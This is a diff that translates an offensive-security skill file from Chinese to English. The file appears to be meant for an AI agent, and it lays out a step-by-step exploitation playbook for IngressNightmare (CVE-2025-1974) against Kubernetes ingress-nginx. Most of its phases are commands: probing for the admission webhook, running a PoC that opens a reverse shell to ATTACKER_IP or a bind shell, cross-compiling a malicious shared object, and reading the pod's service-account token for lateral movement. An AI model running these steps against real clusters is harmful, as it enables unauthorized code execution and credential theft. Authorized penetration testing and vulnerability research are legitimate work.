@@ -1,114 +1,119 @@
 ---
 name: k8s-ingress-nightmare
-description: "IngressNightmare (CVE-2025-1974) — Kubernetes Ingress-NGINX Admission Controller 未授权 RCE。当目标 K8s 集群使用 ingress-nginx、发现 443/8443 端口的 admission webhook、或通过 Pod 网络可达 admission controller 时使用。涵盖漏洞原理、利用条件判断、PoC 使用、后续横向移动。"
+description: "IngressNightmare (CVE-2025-1974) — unauthenticated RCE against the Kubernetes Ingress-NGINX Admission Controller. Use when the target K8s cluster runs ingress-nginx, an admission webhook is found on port 443/8443, or the admission controller is reachable over the pod network. Covers the vulnerability mechanics, exploitation precondition checks, PoC usage, and follow-on lateral movement."
+zh-signals: "IngressNightmare（CVE-2025-1974）Kubernetes Ingress-NGINX Admission Controller 未授权 RCE 的判定、利用与横向移动。信号:IngressNightmare,CVE-2025-1974,ingress-nginx,admission webhook,K8s RCE"
+when-to-use: >-
+  Use when a target Kubernetes cluster runs ingress-nginx, exposes an admission
+  webhook on 443/8443, or the admission controller is reachable from the pod
+  network.
 metadata:
-  tags: "k8s,kubernetes,ingress-nginx,cve-2025-1974,ingressnightmare,rce,admission,webhook,云原生"
+  tags: "k8s,kubernetes,ingress-nginx,cve-2025-1974,ingressnightmare,rce,admission,webhook,cloud-native"
   category: "cloud"
 ---
 
 # IngressNightmare — CVE-2025-1974
 
-Ingress-NGINX Admission Controller 未授权 RCE 漏洞链（CVSSv3 9.8），无需任何 K8s 凭据即可从 Pod 网络远程执行任意代码。
+Ingress-NGINX Admission Controller unauthenticated RCE exploit chain (CVSSv3 9.8), allowing remote code execution from the pod network without any K8s credentials.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 漏洞原理与利用细节 → [references/exploit-details.md](references/exploit-details.md)
+- Vulnerability mechanics and exploitation details → [references/exploit-details.md](references/exploit-details.md)
 
 ---
 
-## 漏洞概述
+## Vulnerability Overview
 
-IngressNightmare 是一组**漏洞链**（CVE-2025-24514 / CVE-2025-1097 / CVE-2025-1098 / CVE-2025-1974），攻击者通过两步实现 RCE：
+IngressNightmare is a set of **exploit chains** (CVE-2025-24514 / CVE-2025-1097 / CVE-2025-1098 / CVE-2025-1974) that achieve RCE in two steps:
 
-1. 向 NGINX 发送大请求，使其缓存为临时文件（`/tmp/` 下可预测路径）
-2. 向 Admission Webhook 发送恶意 `AdmissionReview`，注入 `ssl_engine` 指令加载恶意 `.so`
-3. Webhook 运行 `nginx -t` 检查配置时触发代码执行
+1. Send a large request to NGINX so that it is cached as a temporary file (at a predictable path under `/tmp/`)
+2. Send a malicious `AdmissionReview` to the Admission Webhook, injecting an `ssl_engine` directive that loads a malicious `.so`
+3. Code execution is triggered when the webhook runs `nginx -t` to validate the configuration
 
-## Phase 1: 前置条件确认
+## Phase 1: Confirm the Preconditions
 
-### 1.1 确认目标使用 ingress-nginx
+### 1.1 Confirm the target uses ingress-nginx
 ```bash
-# 从集群外部
+# From outside the cluster
 nmap -sV -p 443,8443,80 TARGET_IP
-curl -sk https://TARGET_IP/ -I  # 看 Server 头是否包含 nginx
+curl -sk https://TARGET_IP/ -I  # check whether the Server header contains nginx
 
-# 从 Pod 内部
+# From inside a pod
 kubectl get pods -n ingress-nginx 2>/dev/null
 kubectl get svc -n ingress-nginx 2>/dev/null
 env | grep -i ingress
 ```
 
-### 1.2 定位 Admission Webhook
+### 1.2 Locate the Admission Webhook
 ```bash
-# Admission webhook 默认监听 8443 端口
-# 从 Pod 网络内部探测
+# The admission webhook listens on port 8443 by default
+# Probe it from inside the pod network
 INGRESS_SVC=$(kubectl get svc -n ingress-nginx -o jsonpath='{.items[0].spec.clusterIP}' 2>/dev/null)
 curl -sk https://${INGRESS_SVC}:8443/networking/v1/ingresses
 
-# 也可以直接探测 Pod IP
+# You can also probe pod IPs directly
 kubectl get pods -n ingress-nginx -o wide 2>/dev/null
 ```
 
-### 1.3 定位 NGINX Uploader（请求缓存端点）
+### 1.3 Locate the NGINX Uploader (the request-caching endpoint)
 ```bash
-# NGINX 监听在 80/443，需要能向其发送大请求
-# uploader 就是 ingress-nginx 的 HTTP 入口
+# NGINX listens on 80/443 and you need to be able to send large requests to it
+# the uploader is the HTTP entry point of ingress-nginx
 UPLOADER="http://${INGRESS_SVC}:80"
-# 或直接用 Pod IP
+# or use the pod IP directly
 UPLOADER="http://POD_IP:80"
 ```
 
-## Phase 2: 利用
+## Phase 2: Exploitation
 
-### 2.1 使用 ingressNightmare PoC
+### 2.1 Use the ingressNightmare PoC
 
 ```bash
-# 反弹 shell（最常用）
+# Reverse shell (most common)
 ingressnightmare -m r -r ATTACKER_IP -p 4444 -i https://INGRESS:8443 -u http://UPLOADER:80
 
-# 绑定 shell
+# Bind shell
 ingressnightmare -m b -b 9999 -i https://INGRESS:8443 -u http://UPLOADER:80
 
-# 盲执行命令
+# Blind command execution
 ingressnightmare -m c -c 'id > /tmp/pwn' -i https://INGRESS:8443 -u http://UPLOADER:80
 ```
 
-### 2.2 注入变体选择
+### 2.2 Choosing the Injection Variant
 
-| 注入方式 | 参数 | CVE |
+| Injection method | Parameter | CVE |
 |----------|------|-----|
-| auth-url（默认） | `--is-auth-url` | CVE-2025-24514 |
+| auth-url (default) | `--is-auth-url` | CVE-2025-24514 |
 | auth-tls-match-cn | `--is-match-cn --auth-secret-name NAME` | CVE-2025-1097 |
 | mirror UID | `--is-mirror-uid` | CVE-2025-1098 |
 
-### 2.3 目标架构不匹配处理
+### 2.3 Handling Target Architecture Mismatch
 
 ```bash
-# 如果出现 "Exec format error"，目标可能是 arm64
+# If you see "Exec format error", the target is probably arm64
 ingressnightmare show-c > exp.c
-# 用目标架构的交叉编译器编译
+# Cross-compile for the target architecture
 aarch64-linux-gnu-gcc -fPIC -nostdlib -ffreestanding -fno-builtin -o danger.so exp.c -shared
 ingressnightmare -m c -c 'id' --so ./danger.so -i https://INGRESS:8443 -u http://UPLOADER:80
 ```
 
-## Phase 3: 后续利用
+## Phase 3: Follow-On Exploitation
 
-RCE 落地在 ingress-nginx Pod 内，通常拥有高权限 ServiceAccount：
+The RCE lands inside the ingress-nginx pod, which usually holds a highly privileged ServiceAccount:
 
 ```bash
-# 获取 SA Token
+# Get the SA token
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
-# 检查 RBAC 权限（ingress-nginx 通常有 cluster-wide 权限）
+# Check RBAC permissions (ingress-nginx usually has cluster-wide permissions)
 kubectl auth can-i --list
 
-# 横向 → 参考 k8s-container-escape skill
+# Lateral movement → refer to the k8s-container-escape skill
 ```
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 | 安装 / 路径 |
+| Tool | Purpose | Installation / Path |
 |------|------|-------------|
-| ingressnightmare | CVE-2025-1974 一体化 PoC（Go 编译，多平台） | `f8x -cloud` 安装到 PATH；arsenal 投递物在 `/pentest/arsenal/ingressnightmare/` |
-| kubectl | K8s 集群管理 | `f8x -cloud` |
-| nmap | 端口探测 | `apt install nmap` |
+| ingressnightmare | All-in-one PoC for CVE-2025-1974 (Go build, multi-platform) | Install into PATH with `f8x -cloud`; the arsenal payload is at `/pentest/arsenal/ingressnightmare/` |
+| kubectl | K8s cluster management | `f8x -cloud` |
+| nmap | Port probing | `apt install nmap` |
